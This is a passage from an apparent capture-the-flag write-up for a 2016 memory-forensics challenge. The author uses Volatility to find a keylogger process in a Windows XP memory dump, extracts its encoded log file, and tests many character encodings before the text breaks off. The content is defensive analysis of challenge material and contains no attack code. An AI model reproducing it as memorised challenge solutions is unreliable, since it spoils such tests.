<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw imageinfo</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</div><div class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</div><div class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</div><div class="line">                     AS Layer2 : FileAddressSpace (/home/noraj/CTF/WhiteHat_GrandPrix/2016/For2/bkav5.raw)</div><div class="line">                      PAE type : PAE</div><div class="line">                           DTB : 0x334000L</div><div class="line">                          KDBG : 0x8054d2e0L</div><div class="line">          Number of Processors : 2</div><div class="line">     Image Type (Service Pack) : 3</div><div class="line">                KPCR for CPU 0 : 0xffdff000L</div><div class="line">                KPCR for CPU 1 : 0xfd24c000L</div><div class="line">             KUSER_SHARED_DATA : 0xffdf0000L</div><div class="line">           Image date and time : 2016-11-06 16:47:44 UTC+0000</div><div class="line">     Image local date and time : 2016-11-06 23:47:44 +0700</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw --profile=WinXPSP2x86 pstree</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">Name                                                  Pid   PPid   Thds   Hnds Time</div><div class="line">-------------------------------------------------- ------ ------ ------ ------ ----</div><div class="line">0x8107e020:System                                      4      0     60    228 1970-01-01 00:00:00 UTC+0000</div><div class="line">. 0xff596808:smss.exe                                 544      4      3     17 2016-11-06 16:44:22 UTC+0000</div><div class="line">.. 0xff4b4da0:winlogon.exe                            644    544     25    524 2016-11-06 16:44:23 UTC+0000</div><div class="line">... 0xff609998:services.exe                           744    644     13    246 2016-11-06 16:44:25 UTC+0000</div><div class="line">.... 0xff4a3d70:vmacthlp.exe                          928    744      1     25 2016-11-06 16:44:26 UTC+0000</div><div class="line">.... 0xff67a7e8:spoolsv.exe                          1600    744      6     54 2016-11-06 16:47:21 UTC+0000</div><div class="line">.... 0xff5cfda0:svchost.exe                           992    744     10    178 2016-11-06 16:44:27 UTC+0000</div><div class="line">.... 0xff583888:svchost.exe                          1348    744      6    119 2016-11-06 16:44:27 UTC+0000</div><div class="line">.... 0xff59a7b8:svchost.exe                           944    744      7    122 2016-11-06 16:44:26 UTC+0000</div><div class="line">.... 0x80fdec10:svchost.exe                           180    744      5     88 2016-11-06 16:44:45 UTC+0000</div><div class="line">.... 0xff481020:svchost.exe                          1876    744     15    194 2016-11-06 16:47:07 UTC+0000</div><div class="line">.... 0xff58c7b8:svchost.exe                          1244    744      5     59 2016-11-06 16:44:27 UTC+0000</div><div class="line">... 0xff5be460:lsass.exe                              760    644     25    332 2016-11-06 16:44:25 UTC+0000</div><div class="line">.. 0xff5974d8:csrss.exe                               616    544     10    265 2016-11-06 16:44:22 UTC+0000</div><div class="line">0x80ecf928:explorer.exe                             1740   1704     17    424 2016-11-06 16:44:32 UTC+0000</div><div class="line">. 0xff5bf138:DumpIt.exe                               308   1740      1     27 2016-11-06 16:47:42 UTC+0000</div><div class="line">. 0x80eb7690:rundll32.exe                            1884   1740      4     72 2016-11-06 16:44:37 UTC+0000</div><div class="line">. 0xff5b2888:keylog.exe                              2020   1740      2     35 2016-11-06 16:47:17 UTC+0000</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw --profile=WinXPSP2x86 procdump -p 2020 --dump-dir=.</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">Process(V) ImageBase  Name                 Result</div><div class="line">---------- ---------- -------------------- ------</div><div class="line">0xff5b2888 0x00400000 keylog.exe           OK: executable.2020.exe</div></pre></td></tr></table></figure></p>
<ul>
<li>See a supicious <code>keylog.exe</code> so we dumped it.</li>
<li>Upload it to <a href="https://www.virustotal.com/en/file/7b8b04c340e36d7f78d67cbcd22dd4299e579ebf40abfe79fd6c5d9e7240bc29/analysis/1482010139/" target="_blank" rel="external">Virustotal</a> and to <a href="https://www.hybrid-analysis.com/sample/7b8b04c340e36d7f78d67cbcd22dd4299e579ebf40abfe79fd6c5d9e7240bc29?environmentId=100" target="_blank" rel="external">Hybrid Analysis</a>.</li>
<li>Detection ratio: 4 / 56, a keylogger.</li>
<li>Just look for quick win:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ strings keylog.exe_executable.2020.exe</div><div class="line">[...]</div><div class="line"></div><div class="line">%c  -  %d</div><div class="line">c:/windows/keylog.log</div><div class="line">[WIN]</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<ul>
<li>The malware is saving its collected informations in <code>c:/windows/keylog.log</code>.</li>
<li>Let's find the file and dump it:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw --profile=WinXPSP2x86 filescan | grep -i &apos;keylog.log&apos;</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line"></div><div class="line">Offset(P)            #Ptr   #Hnd Access Name</div><div class="line">------------------ ------ ------ ------ ----</div><div class="line">0x00000000010410a0      1      0 RW-rw- \Device\HarddiskVolume1\WINDOWS\keylog.log</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ volatility -f bkav5.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000010410a0 --dump-dir=.</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">DataSectionObject 0x010410a0   None   \Device\HarddiskVolume1\WINDOWS\keylog.log</div></pre></td></tr></table></figure></p>
<ul>
<li>But this is a non standard encoding:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ file keylog.log_file.None.0x80eb7008.dat</div><div class="line">keylog.log_file.None.0x80eb7008.dat: Non-ISO extended-ASCII text, with NEL line terminators</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ xxd keylog.log_file.None.0x80eb7008.dat</div><div class="line">00000000: 8589 9790 83bd b3ba 859b b0aa bbac 83b6  ................</div><div class="line">00000010: bbb2 b2b1 859b b0aa bbac 83a9 bbb2 b2b1  ................</div><div class="line">00000020: 859c 9f9d 958d 8e9f 9d9b 83bd b1b3 bbfe  ................</div><div class="line">00000030: a7b1 abfe b9ab a7ff 859c 9f9d 958d 8e9f  ................</div><div class="line">00000040: 9d9b 83fe e185 9bb0 aabb ac83 a9bb b2fe  ................</div><div class="line">00000050: b1ac fea9 bbb2 b2fe e185 9bb0 aabb ac83  ................</div><div class="line">00000060: a9b6 bfaa bbac a8bb acfe 869a 859b b0aa  ................</div><div class="line">00000070: bbac 8385 8997 9083 bdb6 acb1 b3bb 859b  ................</div><div class="line">00000080: b0aa bbac 83a9 bbb2 feb1 ac85 9c9f 9d95  ................</div><div class="line">00000090: 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b  ................</div><div class="line">000000a0: 8385 9c9f 9d95 8d8e 9f9d 9b83 b2bd b1b3  ................</div><div class="line">000000b0: bbfe b1ac fea9 bbb2 bdb1 b3bb 859b b0aa  ................</div><div class="line">000000c0: bbac 83ab b6b3 fef0 f0f0 fe85 9c9f 9d95  ................</div><div class="line">000000d0: 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b  ................</div><div class="line">000000e0: 8385 9c9f 9d95 8d8e 9f9d 9b83 859c 9f9d  ................</div><div class="line">000000f0: 958d 8e9f 9d9b 8385 9c9f 9d95 8d8e 9f9d  ................</div><div class="line">00000100: 9b83 859c 9f9d 958d 8e9f 9d9b 8385 9c9f  ................</div><div class="line">00000110: 9d95 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f  ................</div><div class="line">00000120: 9d9b 8385 9c9f 9d95 8d8e 9f9d 9b83 859c  ................</div><div class="line">00000130: 9f9d 958d 8e9f 9d9b 8385 9c9f 9d95 8d8e  ................</div><div class="line">00000140: 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b 8385  ................</div><div class="line">00000150: 9c9f 9d95 8d8e 9f9d 9b83 b7fe b9b1 aafe  ................</div><div class="line">00000160: b7aa fef0 feaa b6bf aafe a9bb b2bd b1b3  ................</div><div class="line">00000170: bbfe e49a 859d aaac b283 aab8 bf85 9bb0  ................</div><div class="line">00000180: aabb ac83 859d aaac b283 aab8 bdbb b1b1  ................</div><div class="line">00000190: b5f0 bdb1 b385 9bb0 aabb ac83 aab6 b7ad  ................</div><div class="line">000001a0: b7ad b3a7 b8b2 bfb9 d7a5 a385 92bb b8aa  ................</div><div class="line">000001b0: 9fac acb1 a983 b5ba b7bb b5b5 bab7 eced  ................</div><div class="line">000001c0: e7ed e9ba b8b6 ede7 b4ad b2ad bab5 e7ed  ................</div><div class="line">000001d0: 859b b0aa bbac 83aa b6bf b0b5 a7b1 abff  ................</div><div class="line">000001e0: 859b b0aa bbac 83e4 9abf bcbd babb b8b9  ................</div><div class="line">000001f0: b6b7 b5b2 b3b0 b1ae afac adaa e1e1 e1a7  ................</div></pre></td></tr></table></figure></p>
<ul>
<li>This is nor UTF-8, nor WINDOWS-1252/C1252.</li>
<li>Try to determine what kind of encoding this is (source: <a href="http://superuser.com/questions/669700/non-iso-extended-ascii-text/669729#answer-732589" target="_blank" rel="external">superuser.com</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ iconv --list | sed &apos;s/\/\/$//&apos; | sort &gt; encodings.list</div><div class="line">$ for a in `cat encodings.list`; do</div><div class="line">printf &quot;$a  &quot;</div><div class="line">iconv -f $a -t UTF-8 keylog.log_file.None.0x80eb7008.dat &gt; /dev/null 2&gt;&amp;1 \</div><div class="line">&amp;&amp; echo &quot;ok: $a&quot; || echo &quot;fail: $a&quot;</div><div class="line">done | tee result.txt</div></pre></td></tr></table></figure></p>
<ul>
<li>Let's take a look at results:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div></pre></td><td class="code"><pre><div class="line">1026  ok: 1026</div><div class="line">1047  ok: 1047</div><div class="line">437  ok: 437</div><div class="line">500  ok: 500</div><div class="line">500V1  ok: 500V1</div><div class="line">850  ok: 850</div><div class="line">851  ok: 851</div><div class="line">852  ok: 852</div><div class="line">855  ok: 855</div><div class="line">860  ok: 860</div><div class="line">861  ok: 861</div><div class="line">862  ok: 862</div><div class="line">863  ok: 863</div><div class="line">865  ok: 865</div><div class="line">866  ok: 866</div><div class="line">866NAV  ok: 866NAV</div><div class="line">8859_1  ok: 8859_1</div><div class="line">8859_2  ok: 8859_2</div><div class="line">8859_4  ok: 8859_4</div><div class="line">8859_5  ok: 8859_5</div><div class="line">8859_9  ok: 8859_9</div><div class="line">BALTIC  ok: BALTIC</div><div class="line">CP037  ok: CP037</div><div class="line">CP10007  ok: CP10007</div><div class="line">CP1025  ok: CP1025</div><div class="line">CP1026  ok: CP1026</div><div class="line">CP1047  ok: CP1047</div><div class="line">CP1070  ok: CP1070</div><div class="line">CP1079  ok: CP1079</div><div class="line">CP1081  ok: CP1081</div><div class="line">CP1084  ok: CP1084</div><div class="line">CP1097  ok: CP1097</div><div class="line">CP1112  ok: CP1112</div><div class="line">CP1122  ok: CP1122</div><div class="line">CP1123  ok: CP1123</div><div class="line">CP1124  ok: CP1124</div><div class="line">CP1125  ok: CP1125</div><div class="line">CP1129  ok: CP1129</div><div class="line">CP1130  ok: CP1130</div><div class="line">CP1137  ok: CP1137</div><div class="line">CP1140  ok: CP1140</div><div class="line">CP1141  ok: CP1141</div><div class="line">CP1142  ok: CP1142</div><div class="line">CP1143  ok: CP1143</div><div class="line">CP1144  ok: CP1144</div><div class="line">CP1145  ok: CP1145</div><div class="line">CP1146  ok: CP1146</div><div class="line">CP1147  ok: CP1147</div><div class="line">CP1148  ok: CP1148</div><div class="line">CP1149  ok: CP1149</div><div class="line">CP1153  ok: CP1153</div><div class="line">CP1154  ok: CP1154</div><div class="line">CP1155  ok: CP1155</div><div class="line">CP1156  ok: CP1156</div><div class="line">CP1157  ok: CP1157</div><div class="line">CP1158  ok: CP1158</div><div class="line">CP1160  ok: CP1160</div><div class="line">CP1163  ok: CP1163</div><div class="line">CP1164  ok: CP1164</div><div class="line">CP1166  ok: CP1166</div><div class="line">CP1167  ok: CP1167</div><div class="line">CP1251  ok: CP1251</div><div class="line">CP1256  ok: CP1256</div><div class="line">CP1282  ok: CP1282</div><div class="line">CP1390  ok: CP1390</div><div class="line">CP1399  ok: CP1399</div><div class="line">CP273  ok: CP273</div><div class="line">CP278  ok: CP278</div><div class="line">CP280  ok: CP280</div><div class="line">CP282  ok: CP282</div><div class="line">CP284  ok: CP284</div><div class="line">CP285  ok: CP285</div><div class="line">CP297  ok: CP297</div><div class="line">CP437  ok: CP437</div><div class="line">CP500  ok: CP500</div><div class="line">CP5347  ok: CP5347</div><div class="line">CP737  ok: CP737</div><div class="line">CP770  ok: CP770</div><div class="line">CP771  ok: CP771</div><div class="line">CP772  ok: CP772</div><div class="line">CP773  ok: CP773</div><div class="line">CP774  ok: CP774</div><div class="line">CP775  ok: CP775</div><div class="line">CP819  ok: CP819</div><div class="line">CP850  ok: CP850</div><div class="line">CP851  ok: CP851</div><div class="line">CP852  ok: CP852</div><div class="line">CP855  ok: CP855</div><div class="line">CP860  ok: CP860</div><div class="line">CP861  ok: CP861</div><div class="line">CP862  ok: CP862</div><div class="line">CP863  ok: CP863</div><div class="line">CP865  ok: CP865</div><div class="line">CP866  ok: CP866</div><div class="line">CP866NAV  ok: CP866NAV</div><div class="line">CP870  ok: CP870</div><div class="line">CP871  ok: CP871</div><div class="line">CP880  ok: CP880</div><div class="line">CP901  ok: CP901</div><div class="line">CP902  ok: CP902</div><div class="line">CP9030  ok: CP9030</div><div class="line">CP912  ok: CP912</div><div class="line">CP915  ok: CP915</div><div class="line">CP920  ok: CP920</div><div class="line">CP921  ok: CP921</div><div class="line">CP922  ok: CP922</div><div class="line">CP9448  ok: CP9448</div><div class="line">CP-HU  ok: CP-HU</div><div class="line">CPIBM861  ok: CPIBM861</div><div class="line">CSIBM037  ok: CSIBM037</div><div class="line">CSIBM1025  ok: CSIBM1025</div><div class="line">CSIBM1026  ok: CSIBM1026</div><div class="line">CSIBM1097  ok: CSIBM1097</div><div class="line">CSIBM1112  ok: CSIBM1112</div><div class="line">CSIBM1122  ok: CSIBM1122</div><div class="line">CSIBM1123  ok: CSIBM1123</div><div class="line">CSIBM1124  ok: CSIBM1124</div><div class="line">CSIBM1129  ok: CSIBM1129</div><div class="line">CSIBM1130  ok: CSIBM1130</div><div class="line">CSIBM1137  ok: CSIBM1137</div><div class="line">CSIBM1140  ok: CSIBM1140</div><div class="line">CSIBM1141  ok: CSIBM1141</div><div class="line">CSIBM1142  ok: CSIBM1142</div><div class="line">CSIBM1143  ok: CSIBM1143</div><div class="line">CSIBM1144  ok: CSIBM1144</div><div class="line">CSIBM1145  ok: CSIBM1145</div><div class="line">CSIBM1146  ok: CSIBM1146</div><div class="line">CSIBM1147  ok: CSIBM1147</div><div class="line">CSIBM1148  ok: CSIBM1148</div><div class="line">CSIBM1149  ok: CSIBM1149</div><div class="line">CSIBM1153  ok: CSIBM1153</div><div class="line">CSIBM1154  ok: CSIBM1154</div><div class="line">CSIBM1155  ok: CSIBM1155</div><div class="line">CSIBM1156  ok: CSIBM1156</div><div class="line">CSIBM1157  ok: CSIBM1157</div><div class="line">CSIBM1158  ok: CSIBM1158</div><div class="line">CSIBM1160  ok: CSIBM1160</div><div class="line">CSIBM1163  ok: CSIBM1163</div><div class="line">CSIBM1164  ok: CSIBM1164</div><div class="line">CSIBM1166  ok: CSIBM1166</div><div class="line">CSIBM1167  ok: CSIBM1167</div><div class="line">CSIBM1390  ok: CSIBM1390</div><div class="line">CSIBM1399  ok: CSIBM1399</div><div class="line">CSIBM273  ok: CSIBM273</div><div class="line">CSIBM277  ok: CSIBM277</div><div class="line">CSIBM278  ok: CSIBM278</div><div class="line">CSIBM280  ok: CSIBM280</div><div class="line">CSIBM284  ok: CSIBM284</div><div class="line">CSIBM285  ok: CSIBM285</div><div class="line">CSIBM297  ok: CSIBM297</div><div class="line">CSIBM500  ok: CSIBM500</div><div class="line">CSIBM5347  ok: CSIBM5347</div><div class="line">CSIBM851  ok: CSIBM851</div><div class="line">CSIBM855  ok: CSIBM855</div><div class="line">CSIBM860  ok: CSIBM860</div><div class="line">CSIBM863  ok: CSIBM863</div><div class="line">CSIBM865  ok: CSIBM865</div><div class="line">CSIBM866  ok: CSIBM866</div><div class="line">CSIBM870  ok: CSIBM870</div><div class="line">CSIBM871  ok: CSIBM871</div><div class="line">CSIBM880  ok: CSIBM880</div><div class="line">CSIBM901  ok: CSIBM901</div><div class="line">CSIBM902  ok: CSIBM902</div><div class="line">CSIBM9030  ok: CSIBM9030</div><div class="line">CSIBM921  ok: CSIBM921</div><div class="line">CSIBM922  ok: CSIBM922</div><div class="line">CSIBM9448  ok: CSIBM9448</div><div class="line">CSISO111ECMACYRILLIC  ok: CSISO111ECMACYRILLIC</div><div class="line">CSISO139CSN369103  ok: CSISO139CSN369103</div><div class="line">CSISO143IECP271  ok: CSISO143IECP271</div><div class="line">CSISOLATIN1  ok: CSISOLATIN1</div><div class="line">CSISOLATIN2  ok: CSISOLATIN2</div><div class="line">CSISOLATIN4  ok: CSISOLATIN4</div><div class="line">CSISOLATIN5  ok: CSISOLATIN5</div><div class="line">CSISOLATIN6  ok: CSISOLATIN6</div><div class="line">CSISOLATINCYRILLIC  ok: CSISOLATINCYRILLIC</div><div class="line">CSKOI8R  ok: CSKOI8R</div><div class="line">CSMACINTOSH  ok: CSMACINTOSH</div><div class="line">CSN_369103  ok: CSN_369103</div><div class="line">CSPC775BALTIC  ok: CSPC775BALTIC</div><div class="line">CSPC850MULTILINGUAL  ok: CSPC850MULTILINGUAL</div><div class="line">CSPC862LATINHEBREW  ok: CSPC862LATINHEBREW</div><div class="line">CSPC8CODEPAGE437  ok: CSPC8CODEPAGE437</div><div 